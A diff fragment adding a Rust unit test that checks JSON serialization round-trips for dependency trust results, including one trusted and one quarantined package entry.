+            let nested_structures = vec![
+                RunDependencyTrustResult {
+                    dependency_name: "test-package".to_string(),
+                    version_requirement: "*".to_string(),
+                    section: "dependencies".to_string(),
+                    extension_id: "ext-123".to_string(),
+                    status: RunDependencyTrustStatus::Trusted,
+                    trust_card_version: Some(1),
+                    risk_level: Some("LOW".to_string()),
+                    detail: "All checks passed".to_string(),
+                },
+                RunDependencyTrustResult {
+                    dependency_name: "malicious-package".to_string(),
+                    version_requirement: ">=0.0.0".to_string(),
+                    section: "dev-dependencies".to_string(),
+                    extension_id: "ext-456".to_string(),
+                    status: RunDependencyTrustStatus::Quarantined,
+                    trust_card_version: None,
+                    risk_level: Some("CRITICAL".to_string()),
+                    detail: "Multiple security vulnerabilities detected".to_string(),
+                },
+            ];
+
+            for (i, nested_struct) in nested_structures.iter().enumerate() {
+                let serialization = serde_json::to_string(nested_struct);
+                assert!(serialization.is_ok(),
+                       "Nested structure {} should serialize", i);
+
+                let json_str = serialization.unwrap();
+                let deserialization: Result<RunDependencyTrustResult, _> = serde_json::from_str(&json_str);
+                assert!(deserialization.is_ok(),
+                       "Nested structure {} should deserialize", i);
+
+                let deserialized = deserialization.unwrap();
+                assert_eq!(nested_struct.dependency_name, deserialized.dependency_name,
+                          "Dependency name should be preserved");
+                assert_eq!(nested_struct.status, deserialized.status,
+                          "Status should be preserved");
+            }
+        }
     }
 }
